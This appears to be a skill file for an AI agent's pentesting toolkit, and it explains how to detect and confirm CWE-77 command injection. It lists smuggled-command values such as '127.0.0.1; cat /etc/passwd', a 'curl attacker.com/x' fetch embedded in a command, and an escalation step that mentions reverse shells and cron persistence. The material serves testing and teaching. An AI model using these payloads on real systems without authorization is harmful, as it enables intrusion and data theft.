
name: cwe-77-command-injection
description: Use when a web injection sink accepts CWE input.
version: 1.0.0
license: MIT
platforms: [linux, windows]
tags: [cwe, cwe-77, injection, a05, pentest, owasp]
category: pentesting-skills
related_skills:
  - owasp-a05-injection
---

# CWE-77 - Improper Neutralization of Special Elements used in a Command (Command Injection)

CWE-77: the app builds a command from user input without escaping shell metacharacters, letting the attacker inject a new command.

## Parent Skill

This is a sub-skill of `owasp-a05-injection` (OWASP A05 Injection, Top 10 2025).
Load the parent for overall A05 scope, the test procedure, and validation criteria
(negative control). This skill covers the CWE-77 detail: what to look for,
how to trigger it, and what a confirmed finding looks like.

## When to Use

- Any parameter that ends up in a system command (ping, convert, mail, exec, eval).

## Detection & Test

1. **Find command sinks.** Look for `system()`, `exec()`, `popen()`, backticks, `Runtime.exec` calls that use user input.
2. **Test shell metacharacters.** Send `;`, `|`, `&&`, `||`, backticks, `$(...)`, newline into the parameter.
3. **Confirm execution.** Use a time delay (`; sleep 5`) or file write to confirm a second command ran.
4. **Escalate.** If confirmed, try to read a file, run a reverse shell, or write a cron job.
5. **Document the sink, payload, and proof.

## Example Findings

- `ping host` where host = `127.0.0.1; cat /etc/passwd`.
- A `convert` tool that runs `convert $(curl attacker.com/x) out.png`.

## Impact

- Data disclosure, logic manipulation, or code execution through the injection point.
- Privilege escalation or session hijack if the injection reaches auth/session logic.
- Persistence until the sink is parameterized or the input is validated.
- Lateral movement when the same unsanitized sink repeats across endpoints.

## See Also

- `owasp-a05-injection` - parent skill (A05 scope, Test Procedure, Validation, reporting).
- `owasp-top10-2025-testing` - top-level OWASP Top 10 2025 reference (full 249-CWE table, priority order).